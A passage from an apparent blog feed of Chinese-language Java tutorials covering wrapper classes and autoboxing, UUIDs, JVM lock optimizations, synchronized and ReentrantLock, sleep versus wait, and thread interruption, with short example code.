class="line-numbers-rows"><span></span></span></code></pre><p>基本数据类型的成员变量都有默认值，如以上代码 status 默认值为 0，如果定义中 0 代表失败，那样就会有问题，这样只能使用包装类 Integer，它的默认值为 null,所以就不会有默认值影响。</p><p><strong>3、方法参数允许定义空值；</strong></p><pre class="line-numbers language-none"><code class="language-none">private static void test1(int status)&#123;System.out.println(status);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>看以上代码，方法参数定义的是基本数据类型 int，所以必须得传一个数字过来，不能传 null，很多场合我们希望是能传递 null 的，所以这种场合用包装类比较合适。</p><p>还有更多应用场景就不一一例举了，欢迎留言共同探讨包装类的更多的应用场景。</p><h4 id="自动装箱、拆箱"><a href="#自动装箱、拆箱" class="headerlink" title="自动装箱、拆箱"></a>自动装箱、拆箱</h4><p>Java 5 增加了自动装箱、拆箱机制，提供基本数据类型和包装类型的相互转换操作。</p><p><strong>自动装箱</strong></p><p>自动装箱即自动将基本数据类型转换成包装类型，在 Java 5 之前，要将基本数据类型转换成包装类型只能这样做，看下面的代码。</p><pre class="line-numbers language-none"><code class="language-none">Integer i1 &#x3D; new Integer(8);Integer i2 &#x3D; Integer.valueOf(8);&#x2F;&#x2F; 自动装箱Integer i3 &#x3D; 8;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上 3 种都可以进行转换，但在 Java 5 之前第 3 种方法是编译失败的，第 3 种方法也正是现在的自动装箱功能。另外，第一种构造器方法也不推荐使用了，已经标为废弃了。</p><p>其实自动装箱的原理就是调用包装类的 valueOf 方法，如第 2 个方法中的 Integer.valueOf 方法。</p><p><strong>自动拆箱</strong></p><p>自动拆箱即自动将包装类型转换成基本数据类型，与自动装箱相反，有装就有拆，很好理解。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 自动拆箱int i4 &#x3D; i3;int i5 &#x3D; i3.intValue();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>继续上面的例子，把 i3 赋值给 i4 就是实现的自动拆箱功能，自动装箱的原理就是调用包装类的 xxValue 方法，如 i5 中的 Integer 的 intValue 方法。</p><p>自动装箱、拆箱不只是体现在以上的例子，在方法接收参数、对象设置参数时都能自动装箱拆箱。</p><p><strong>需要注意的是，关于 Integer，-128 ~ 127 会有缓存，对比这个范围的值的对象是一个坑，这个在阿里巴巴规范中也有提及。</strong> 详细请参考《<a href="https://mp.weixin.qq.com/s/PnVkrMzYeOiepPKjl4MKVA">IntegerCache的妙用和陷阱</a>》这篇文章。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通用唯一标识码 UUID 的介绍及使用。</title>
      <link href="/2025/10/14/%E5%9F%BA%E7%A1%80/%E9%80%9A%E7%94%A8%E5%94%AF%E4%B8%80%E6%A0%87%E8%AF%86%E7%A0%81%20UUID%20%E7%9A%84%E4%BB%8B%E7%BB%8D%E5%8F%8A%E4%BD%BF%E7%94%A8%E3%80%82/"/>
      <url>/2025/10/14/%E5%9F%BA%E7%A1%80/%E9%80%9A%E7%94%A8%E5%94%AF%E4%B8%80%E6%A0%87%E8%AF%86%E7%A0%81%20UUID%20%E7%9A%84%E4%BB%8B%E7%BB%8D%E5%8F%8A%E4%BD%BF%E7%94%A8%E3%80%82/</url>
      
        <content type="html"><![CDATA[<h4 id="什么是UUID？"><a href="#什么是UUID？" class="headerlink" title="什么是UUID？"></a>什么是UUID？</h4><p>UUID全称：Universally Unique Identifier，即通用唯一识别码。</p><p>UUID是由一组32位数的16进制数字所构成，是故UUID理论上的总数为16^32 &#x3D; 2^128，约等于3.4 x 10^38。也就是说若每纳秒产生1兆个UUID，要花100亿年才会将所有UUID用完。</p><p>UUID的标准型式包含32个16进制数字，以连字号分为五段，形式为8-4-4-4-12的32个字符，如：550e8400-e29b-41d4-a716-446655440000。</p><h4 id="UUID的作用"><a href="#UUID的作用" class="headerlink" title="UUID的作用"></a>UUID的作用</h4><p>UUID的是让分布式系统中的所有元素都能有唯一的辨识信息，而不需要通过中央控制端来做辨识信息的指定。如此一来，每个人都可以创建不与其它人冲突的UUID。在这样的情况下，就不需考虑数据库创建时的名称重复问题。目前最广泛应用的UUID，是微软公司的全局唯一标识符（GUID），而其他重要的应用，则有Linux ext2&#x2F;ext3文件系统、LUKS加密分区、GNOME、KDE、Mac OS X等等。</p><h4 id="UUID的组成"><a href="#UUID的组成" class="headerlink" title="UUID的组成"></a>UUID的组成</h4><p>UUID是指在一台机器上生成的数字，它保证对在同一时空中的所有机器都是唯一的。通常平台会提供生成的API。按照开放软件基金会(OSF)制定的标准计算，用到了以太网卡地址、纳秒级时间、芯片ID码和许多可能的数字。</p><p><strong>UUID由以下几部分的组合：</strong></p><ul><li><p>当前日期和时间，UUID的第一个部分与时间有关，如果你在生成一个UUID之后，过几秒又生成一个UUID，则第一个部分不同，其余相同。</p></li><li><p>时钟序列。</p></li><li><p>全局唯一的IEEE机器识别号，如果有网卡，从网卡MAC地址获得，没有网卡以其他方式获得。</p></li></ul><p>UUID的唯一缺陷在于生成的结果串会比较长。关于UUID这个标准使用最普遍的是微软的GUID(Globals Unique Identifiers)。</p><h4 id="UUID的生成"><a href="#UUID的生成" class="headerlink" title="UUID的生成"></a>UUID的生成</h4><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) throws Exception &#123;System.out.println(UUID.randomUUID());&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>批量生成UUID网站：<a href="http://www.uuid.online/">http://www.uuid.online/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java虚拟机对锁优化所做的努力</title>
      <link href="/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/Java%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AF%B9%E9%94%81%E4%BC%98%E5%8C%96%E6%89%80%E5%81%9A%E7%9A%84%E5%8A%AA%E5%8A%9B/"/>
      <url>/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/Java%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AF%B9%E9%94%81%E4%BC%98%E5%8C%96%E6%89%80%E5%81%9A%E7%9A%84%E5%8A%AA%E5%8A%9B/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-6-10/54034705.jpg"></p><p>作为一款公用平台，JDK 本身也为并发程序的性能绞尽脑汁，在 JDK 内部也想尽一切办法提供并发时的系统吞吐量。这里，我将向大家简单介绍几种 JDK 内部的 “锁” 优化策略。</p><h3 id="1、-锁偏向"><a href="#1、-锁偏向" class="headerlink" title="1、 锁偏向"></a>1、 锁偏向</h3><p>锁偏向是一种针对加锁操作的优化手段。</p><p>如果一个线程获得了锁，那么锁就进入偏向模式。当这个线程再次请求锁时，无须再做任何同步操作。这样就节省了大量有关锁申请的操作，从而提高了程序性能。因此，对于几乎没有锁竞争的场合，偏向锁有比较红啊的优化效果，因为连续多次极有可能是同一个线程请求相同的锁。而对于锁竞争比较激烈的场合，其效果不佳。因为在竞争激烈的场合，最有可能的情况是每次都是不同的线程来请求相同的锁。</p><h3 id="2、-轻量级锁"><a href="#2、-轻量级锁" class="headerlink" title="2、 轻量级锁"></a>2、 轻量级锁</h3><p>如果偏向锁失败，即上一个请求的锁的线程和这个线程不是同一个。偏向锁失败意味者不能避免做同步操作。此时，虚拟机并不会立即挂起线程。他会使用一种成为轻量级锁的优化手段。 轻量级锁的操作也很方便，它只是简单地将对象头部作为指针，指向蚩尤锁的线程堆栈的内部，来判断一个线程是否持有对象锁。 如果线程获得轻量级锁成功，则可以顺利进入临界区。如果轻量级锁失败，则表示其他线程抢先争夺了锁，那么当前线程的锁请求就会膨胀为重量级锁。</p><h3 id="3、-自选锁"><a href="#3、-自选锁" class="headerlink" title="3、 自选锁"></a>3、 自选锁</h3><p>锁膨胀后，虚拟机为了避免线程真实地在操作系统层面挂起，虚拟机还会在做最后的努力–自选锁。由于当前线程暂时无法获得锁，但是什么时候可以获得锁是一个未知数。也许在CPU几个时钟周期后，就可以得到锁。如果这样，简单粗暴的挂起线程可能是一种得不偿失的操作，因此系统会进行一次赌注：它会假设在不久的将来，线程可以得到这把锁。因此虚拟机让当前线程做个空循环，在经过若干次循环后，如果可以得到锁，那么就顺利进入临界区。如果还不能得到锁，才会真实地将线程在操作系统层面挂起。</p><h3 id="4、-锁消除"><a href="#4、-锁消除" class="headerlink" title="4、 锁消除"></a>4、 锁消除</h3><p>锁消除是一种更彻底的锁优化。Java虚拟机在JIT编译时，通过对运行上下文的扫描，去除不可能存在共享资源竞争的锁。通过锁消除，可以节省毫无意义的请求锁时间。</p><p>下面这种这种情况，我们使用vector， 而vector内部使用了synchronize请求锁。</p><pre class="line-numbers language-none"><code class="language-none">public String []  createStrings()&#123;    Vector&lt;String&gt;  v&#x3D; new Vector&lt;String&gt;();    for(int i&#x3D;0;i&lt;100;i++)&#123;        v.add(Integer.toString(i));    &#125;    return v.toArray(new String[]&#123;&#125;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于V只在函数 createStrnigs 中使用，因此它只是一个单纯的局部变量。局部变量是在线程栈上分配的，属于线程私有额数据，因此不可能被其他线程访问。所以，在这种情况下，Vector内部所有加锁同步都是没有必要的。如果虚拟机检测到这种情况，就会将这些无用的锁操作去除。</p><p>锁消除涉及的一项关键技术为逃逸分析。所谓逃逸分析就是观察某一个变量是否会逃出某一个作用域。在本例中，变量v显然没有逃出createString 函数之外。以此为基础，虚拟机才可以大胆的将v内部的加锁操作去除。如果createStrings 返回的不是String数组，而是v本身，那么就认为变量v逃逸出了当前函数，也就是说v有可能被其他线程访问。如是这样，虚拟机就不能消除v中的锁操作。</p><p>逃逸分析必须在 -server 模式下进行，可以使用 -XX:DoEscapeAnalysis 参数打开逃逸分析，使用 -XX:+EliminateLocks 参数可以打开锁消除。</p><p>本文摘自《Java高并发程序设计》一书。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Synchronized 与 ReentrantLock 的区别！</title>
      <link href="/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/Synchronized%20%E4%B8%8E%20ReentrantLock%20%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%81/"/>
      <url>/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/Synchronized%20%E4%B8%8E%20ReentrantLock%20%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p><strong>可重入性：</strong></p><p>从名字上理解，ReenTrantLock的字面意思就是再进入的锁，其实synchronized关键字所使用的锁也是可重入的，两者关于这个的区别不大。两者都是同一个线程没进入一次，锁的计数器都自增1，所以要等到锁的计数器下降为0时才能释放锁。</p><p><strong>锁的实现：</strong></p><p>Synchronized是依赖于JVM实现的，而ReenTrantLock是JDK实现的，有什么区别，说白了就类似于操作系统来控制实现和用户自己敲代码实现的区别。前者的实现是比较难见到的，后者有直接的源码可供阅读。</p><p><strong>性能的区别：</strong></p><p>在Synchronized优化以前，synchronized的性能是比ReenTrantLock差很多的，但是自从Synchronized引入了偏向锁，轻量级锁（自旋锁）后，两者的性能就差不多了，在两种方法都可用的情况下，官方甚至建议使用synchronized，其实synchronized的优化我感觉就借鉴了ReenTrantLock中的CAS技术。都是试图在用户态就把加锁问题解决，避免进入内核态的线程阻塞。</p><p><strong>功能区别：</strong></p><p>便利性：很明显Synchronized的使用比较方便简洁，并且由编译器去保证锁的加锁和释放，而ReenTrantLock需要手工声明来加锁和释放锁，为了避免忘记手工释放锁造成死锁，所以最好在finally中声明释放锁。</p><p>锁的细粒度和灵活度：很明显ReenTrantLock优于Synchronized</p><p><strong>ReenTrantLock独有的能力：</strong></p><p>1.ReenTrantLock可以指定是公平锁还是非公平锁。而synchronized只能是非公平锁。所谓的公平锁就是先等待的线程先获得锁。</p><p>2.ReenTrantLock提供了一个Condition（条件）类，用来实现分组唤醒需要唤醒的线程们，而不是像synchronized要么随机唤醒一个线程要么唤醒全部线程。</p><p>3.ReenTrantLock提供了一种能够中断等待锁的线程的机制，通过lock.lockInterruptibly()来实现这个机制。</p><p><strong>ReenTrantLock实现的原理：</strong></p><p>在网上看到相关的源码分析，本来这块应该是本文的核心，但是感觉比较复杂就不一一详解了，简单来说，ReenTrantLock的实现是一种自旋锁，通过循环调用CAS操作来实现加锁。它的性能比较好也是因为避免了使线程进入内核态的阻塞状态。想尽办法避免线程进入内核的阻塞状态是我们去分析和理解锁设计的关键钥匙。</p><p><strong>什么情况下使用ReenTrantLock：</strong></p><p>答案是，如果你需要实现ReenTrantLock的三个独有功能时。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Synchronized 有几种用法？</title>
      <link href="/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/Synchronized%20%E6%9C%89%E5%87%A0%E7%A7%8D%E7%94%A8%E6%B3%95%EF%BC%9F/"/>
      <url>/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/Synchronized%20%E6%9C%89%E5%87%A0%E7%A7%8D%E7%94%A8%E6%B3%95%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p>我们都知道 Synchronized 是线程安全同步用的，大部分程序可能只会用到同步方法上面。其实 Synchronized 可以用到更多的场合，栈长列举了以下几个用法。</p><h2 id="1、同步普通方法"><a href="#1、同步普通方法" class="headerlink" title="1、同步普通方法"></a><strong>1、同步普通方法</strong></h2><p>这个也是我们用得最多的，只要涉及线程安全，上来就给方法来个同步锁。这种方法使用虽然最简单，但是只能作用在单例上面，如果不是单例，同步方法锁将失效。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** * 用在普通方法 *&#x2F;private synchronized void synchronizedMethod() &#123;System.out.println(&quot;synchronizedMethod&quot;);try &#123;Thread.sleep(2000);&#125; catch (InterruptedException e) &#123;e.printStackTrace();&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时，同一个实例只有一个线程能获取锁进入这个方法。</p><h2 id="2、同步静态方法"><a href="#2、同步静态方法" class="headerlink" title="2、同步静态方法"></a>2、同步静态方法</h2><p>同步静态方法，不管你有多少个类实例，同时只有一个线程能获取锁进入这个方法。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** * 用在静态方法 *&#x2F;private synchronized static void synchronizedStaticMethod() &#123;System.out.println(&quot;synchronizedStaticMethod&quot;);try &#123;Thread.sleep(2000);&#125; catch (InterruptedException e) &#123;e.printStackTrace();&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同步静态方法是类级别的锁，一旦任何一个线程进入这个方法，其他所有线程将无法访问这个类的任何同步类锁的方法。</p><h2 id="3、同步类"><a href="#3、同步类" class="headerlink" title="3、同步类"></a>3、同步类</h2><p>下面提供了两种同步类的方法，锁住效果和同步静态方法一样，都是类级别的锁，同时只有一个线程能访问带有同步类锁的方法。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** * 用在类 *&#x2F;private void synchronizedClass() &#123;synchronized (TestSynchronized.class) &#123;System.out.println(&quot;synchronizedClass&quot;);try &#123;Thread.sleep(2000);&#125; catch (InterruptedException e) &#123;e.printStackTrace();&#125;&#125;&#125;&#x2F;** * 用在类 *&#x2F;private void synchronizedGetClass() &#123;synchronized (this.getClass()) &#123;System.out.println(&quot;synchronizedGetClass&quot;);try &#123;Thread.sleep(2000);&#125; catch (InterruptedException e) &#123;e.printStackTrace();&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的两种用法是同步块的用法，这里表示只有获取到这个类锁才能进入这个代码块。</p><h2 id="4、同步this实例"><a href="#4、同步this实例" class="headerlink" title="4、同步this实例"></a>4、同步this实例</h2><p>这也是同步块的用法，表示锁住整个当前对象实例，只有获取到这个实例的锁才能进入这个方法。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** * 用在this *&#x2F;private void synchronizedThis() &#123;synchronized (this) &#123;System.out.println(&quot;synchronizedThis&quot;);try &#123;Thread.sleep(2000);&#125; catch (InterruptedException e) &#123;e.printStackTrace();&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用法和同步普通方法锁一样，都是锁住整个当前实例。</p><h2 id="5、同步对象实例"><a href="#5、同步对象实例" class="headerlink" title="5、同步对象实例"></a>5、同步对象实例</h2><p>这也是同步块的用法，和上面的锁住当前实例一样，这里表示锁住整个 LOCK 对象实例，只有获取到这个 LOCK 实例的锁才能进入这个方法。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** * 用在对象 *&#x2F;private void synchronizedInstance() &#123;synchronized (LOCK) &#123;System.out.println(&quot;synchronizedInstance&quot;);try &#123;Thread.sleep(2000);&#125; catch (InterruptedException e) &#123;e.printStackTrace();&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另外，类锁与实例锁不相互阻塞，但相同的类锁，相同的当前实例锁，相同的对象锁会相互阻塞。</p><p>关于 Synchronized 的几种用法栈长就介绍到这里了，如果你还知道其他的用法，欢迎留言。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sleep( )和wait( )的这5个区别，你知道几个？</title>
      <link href="/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/sleep(%20)%E5%92%8Cwait(%20)%E7%9A%84%E8%BF%995%E4%B8%AA%E5%8C%BA%E5%88%AB%EF%BC%8C%E4%BD%A0%E7%9F%A5%E9%81%93%E5%87%A0%E4%B8%AA%EF%BC%9F/"/>
      <url>/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/sleep(%20)%E5%92%8Cwait(%20)%E7%9A%84%E8%BF%995%E4%B8%AA%E5%8C%BA%E5%88%AB%EF%BC%8C%E4%BD%A0%E7%9F%A5%E9%81%93%E5%87%A0%E4%B8%AA%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p>sleep(休眠) 和 wait(等待) 方法是 Java 多线程中常用的两个方法，它们有什么区别及一些该注意的地方有哪些呢？下面给大家一一分解。</p><p>在之前的文章《<a href="https://mp.weixin.qq.com/s/at8NynjnYvqkFw61kn3Apg">Java多线程神器：join使用及原理</a>》介绍了，它其实用的是 wait 实现的线程等待。</p><h4 id="区别1：使用限制"><a href="#区别1：使用限制" class="headerlink" title="区别1：使用限制"></a>区别1：使用限制</h4><p>使用 sleep 方法可以让让当前线程休眠，时间一到当前线程继续往下执行，在任何地方都能使用，但需要捕获 InterruptedException 异常。</p><pre class="line-numbers language-none"><code class="language-none">try &#123;Thread.sleep(3000L);&#125; catch (InterruptedException e) &#123;e.printStackTrace();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而使用 wait 方法则必须放在 synchronized 块里面，同样需要捕获 InterruptedException 异常，并且需要获取对象的锁。</p><pre class="line-numbers language-none"><code class="language-none">synchronized (lock)&#123;    try &#123;        lock.wait();    &#125; catch (InterruptedException e) &#123;        e.printStackTrace();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而且 wait 还需要额外的方法 notify&#x2F; notifyAll 进行唤醒，它们同样需要放在 synchronized 块里面，且获取对象的锁。。</p><pre class="line-numbers language-none"><code class="language-none">synchronized (lock) &#123;    &#x2F;&#x2F; 随机唤醒    lock.notify();        &#x2F;&#x2F; 唤醒全部    lock.notifyAll();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然也可以使用带时间的 wait(long millis) 方法，时间一到，无需其他线程唤醒，也会重新竞争获取对象的锁继续执行。</p><h4 id="区别2：使用场景"><a href="#区别2：使用场景" class="headerlink" title="区别2：使用场景"></a>区别2：使用场景</h4><p>sleep 一般用于当前线程休眠，或者轮循暂停操作，wait 则多用于多线程之间的通信。</p><h4 id="区别3：所属类"><a href="#区别3：所属类" class="headerlink" title="区别3：所属类"></a>区别3：所属类</h4><p>sleep 是 Thread 类的静态本地方法，wait 则是 Object 类的本地方法。</p><blockquote><p>java.lang.Thread#sleep</p></blockquote><pre class="line-numbers language-none"><code class="language-none">public static native void sleep(long millis) throws InterruptedException;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>java.lang.Object#wait</p></blockquote><pre class="line-numbers language-none"><code class="language-none">public final native void wait(long timeout) throws InterruptedException;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>为什么要这样设计呢？</strong></p><p>因为 sleep 是让当前线程休眠，不涉及到对象类，也不需要获得对象的锁，所以是线程类的方法。wait 是让获得对象锁的线程实现等待，前提是要楚获得对象的锁，所以是类的方法。</p><h4 id="区别4：释放锁"><a href="#区别4：释放锁" class="headerlink" title="区别4：释放锁"></a>区别4：释放锁</h4><pre class="line-numbers language-none"><code class="language-none">Object lock &#x3D; new Object();synchronized (lock) &#123;    try &#123;        lock.wait(3000L);        Thread.sleep(2000L);    &#125; catch (InterruptedException e) &#123;        e.printStackTrace();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如上代码所示，wait 可以释放当前线程对 lock 对象锁的持有，而 sleep 则不会。</p><h4 id="区别5：线程切换"><a href="#区别5：线程切换" class="headerlink" title="区别5：线程切换"></a>区别5：线程切换</h4><p>sleep 会让出 CPU 执行时间且强制上下文切换，而 wait 则不一定，wait 后可能还是有机会重新竞争到锁继续执行的。</p><p>@程序猿 你们还知道别的吗？欢迎留言！</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一文搞懂 Java 线程中断</title>
      <link href="/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82%20Java%20%E7%BA%BF%E7%A8%8B%E4%B8%AD%E6%96%AD/"/>
      <url>/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82%20Java%20%E7%BA%BF%E7%A8%8B%E4%B8%AD%E6%96%AD/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">try &#123;Thread.sleep(3000);&#125; catch (InterruptedException e) &#123;e.printStackTrace();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时线程被打断后，代码会继续运行或者抛出异常结束运行，这并不是我们需要的中断线程的作用。</p><h4 id="到底是什么是线程中断？"><a href="#到底是什么是线程中断？" class="headerlink" title="到底是什么是线程中断？"></a>到底是什么是线程中断？</h4><p>线程中断即线程运行过程中被其他线程给打断了，它与 stop 最大的区别是：stop 是由系统强制终止线程，而线程中断则是给目标线程发送一个中断信号，如果目标线程没有接收线程中断的信号并结束线程，线程则不会终止，具体是否退出或者执行其他逻辑由目标线程决定。</p><p>我们来看下线程中断最重要的 3 个方法，它们都是来自 Thread 类！</p><p><strong>1、java.lang.Thread#interrupt</strong></p><p>中断目标线程，给目标线程发一个中断信号，线程被打上中断标记。</p><p><strong>2、java.lang.Thread#isInterrupted()</strong></p><p>判断目标线程是否被中断，不会清除中断标记。</p><p><strong>3、java.lang.Thread#interrupted</strong></p><p>判断目标线程是否被中断，会清除中断标记。</p><h4 id="线程中断实战"><a href="#线程中断实战" class="headerlink" title="线程中断实战"></a>线程中断实战</h4><p>我们来实例演示下线程中断如何用！</p><p><strong>示例1（中断失败）</strong></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** *  *&#x2F;private static void test1() &#123;Thread thread &#x3D; new Thread(() -&gt; &#123;while (true) &#123;Thread.yield();&#125;&#125;);thread.start();thread.interrupt();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>请问示例1中的线程会被中断吗？答案：不会，因为虽然给线程发出了中断信号，但程序中并没有响应中断信号的逻辑，所以程序不会有任何反应。</p><p><strong>示例2：（中断成功）</strong></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** *  *&#x2F;private static void test2() &#123;Thread thread &#x3D; new Thread(() -&gt; &#123;while (true) &#123;Thread.yield();&#x2F;&#x2F; 响应中断if (Thread.currentThread().isInterrupted()) &#123;System.out.println(&quot;Java技术线程被中断，程序退出。&quot;);return;&#125;&#125;&#125;);thread.start();thread.interrupt();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们给示例2加上了响应中断的逻辑，程序接收到中断信号打印出信息后返回退出。</p><p><strong>示例3（中断失败）</strong></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** *  *&#x2F;private static void test3() throws InterruptedException &#123;Thread thread &#x3D; new Thread(() -&gt; &#123;while (true) &#123;&#x2F;&#x2F; 响应中断if (Thread.currentThread().isInterrupted()) &#123;System.out.println(&quot;Java技术线程被中断，程序退出。&quot;);return;&#125;try &#123;Thread.sleep(3000);&#125; catch (InterruptedException e) &#123;System.out.println(&quot;Java技术线程休眠被中断，程序退出。&quot;);&#125;&#125;&#125;);thread.start();Thread.sleep(2000);thread.interrupt();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>示例3 sleep() 方法被中断，并输出了 <code>Java技术线程休眠被中断，程序退出。</code> 程序继续运行……为什么呢？</p><p>来看 sleep 的源码：</p><p><img src="http://img.javastack.cn/18-6-1/1779530.jpg"></p><p>可以看出 sleep() 方法被中断后会清除中断标记，所以循环会继续运行。。</p><p><strong>示例4（中断成功）</strong></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** *  *&#x2F;private static void test4() throws InterruptedException &#123;Thread thread &#x3D; new Thread(() -&gt; &#123;while (true) &#123;&#x2F;&#x2F; 响应中断if (Thread.currentThread().isInterrupted()) &#123;System.out.println(&quot;Java技术线程被中断，程序退出。&quot;);return;&#125;try &#123;Thread.sleep(3000);&#125; catch (InterruptedException e) &#123;System.out.println(&quot;Java技术线程休眠被中断，程序退出。&quot;);Thread.currentThread().interrupt();&#125;&#125;&#125;);thread.start();Thread.sleep(2000);thread.interrupt();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>示例4全部信息输出并正常退出，只是在 sleep() 方法被中断并清除标记后手动重新中断当前线程，然后程序接收中断信号返回退出。</p><p>通过以上 4 个中断示例，相信对 Java 线程中断的概念有了全面的了解。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>出场率比较高的一道多线程安全面试题</title>
      <link href="/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/%E5%87%BA%E5%9C%BA%E7%8E%87%E6%AF%94%E8%BE%83%E9%AB%98%E7%9A%84%E4%B8%80%E9%81%93%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
      <url>/2025/10/14/%E5%A4%9A%E7%BA%BF%E7%A8%8B/%E5%87%BA%E5%9C%BA%E7%8E%87%E6%AF%94%E8%BE%83%E9%AB%98%E7%9A%84%E4%B8%80%E9%81%93%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
      
